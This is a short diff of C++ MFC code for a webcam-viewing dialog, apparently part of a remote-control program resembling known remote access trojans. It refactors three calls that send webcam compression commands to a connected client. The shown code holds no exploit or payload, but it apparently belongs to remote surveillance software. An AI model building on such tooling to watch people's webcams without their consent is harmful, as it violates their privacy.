@@ -208,7 +208,7 @@ BOOL CVideoDlg::OnInitDialog()
 
 		BYTE bToken = COMMAND_NEXT;
 
-		m_iocpServer->Send2Client(m_ContextObject, &bToken, sizeof(BYTE));
+		m_ContextObject->Send2Client(&bToken, sizeof(BYTE));
 	}
 
 	SetIcon(m_hIcon, TRUE);
@@ -304,7 +304,7 @@ void CVideoDlg::InitCodec(DWORD fccHandler)
 		m_pVideoCodec = NULL;
 		// 通知服务端不启用压缩
 		BYTE bToken = COMMAND_WEBCAM_DISABLECOMPRESS;
-		m_iocpServer->Send2Client(m_ContextObject, &bToken, sizeof(BYTE));
+		m_ContextObject->Send2Client(&bToken, sizeof(BYTE));
 		GetSystemMenu(FALSE)->EnableMenuItem(IDM_ENABLECOMPRESS, MF_BYCOMMAND | MF_DISABLED | MF_GRAYED);
 	}
 }
@@ -329,7 +329,7 @@ void CVideoDlg::OnSysCommand(UINT nID, LPARAM lParam)
 			BYTE	bToken = COMMAND_WEBCAM_ENABLECOMPRESS;
 			if (!bIsChecked)
 				bToken = COMMAND_WEBCAM_DISABLECOMPRESS;
-			m_iocpServer->Send2Client(m_ContextObject, &bToken, sizeof(BYTE));
+			m_ContextObject->Send2Client(&bToken, sizeof(BYTE));
 			break;
 		}
 	}
